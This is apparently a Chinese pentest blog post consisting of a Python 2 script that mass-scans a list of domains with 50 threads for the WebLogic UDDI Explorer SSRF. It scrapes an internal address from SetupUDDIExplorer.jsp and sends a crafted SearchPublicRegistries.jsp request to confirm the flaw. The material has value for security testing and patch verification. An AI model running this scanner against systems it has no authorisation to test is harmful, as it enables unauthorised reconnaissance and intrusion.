+++
date = "2017-04-14T14:43:52+08:00"
description = ""
draft = false
tags = ["ssrf"]
title = "一个检测WebLogic是否存在SSRF的脚本"
topics = ["Python","Pentest"]

+++

### 0x00 检测脚本如下
> ```python
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import re
import sys
import Queue
import requests
import threading

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

queue = Queue.Queue()
mutex = threading.Lock()

class Weblogic_SSRF_Check(threading.Thread):
    """docstring for Weblogic_SSRF_Check"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def check(self,domain,ip):
        payload = "uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search".format(ip=ip)
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content

            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException',html)
            if m:
                mutex.acquire()
                with open('ssrf.txt','a+') as f:
                    print "%s has weblogic ssrf." % domain
                    f.write("%s has weblogic ssrf.\n" % domain)
                mutex.release()
        except Exception,e:
            pass

    def get_registry(self,domain):
        payload = 'uddiexplorer/SetupUDDIExplorer.jsp'
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search('<i>For example: (.*?)/uddi/uddilistener.*?</i>',html)
            if m:
                return m.group(1)
        except Exception,e:
            pass

    def run(self):
        while not self.queue.empty():
            domain = self.queue.get()
            mutex.acquire()
            print domain
            mutex.release()
            ip = self.get_registry(domain)
            self.check(domain,ip)

            self.queue.task_done()


if __name__ == '__main__':
    with open('domain.txt','r') as f:
        lines = f.readlines()
    for line in lines:
        queue.put(line.strip())

    for x in xrange(1,50):
        t = Weblogic_SSRF_Check(queue)
        t.setDaemon(True)
        t.start()
    queue.join()
```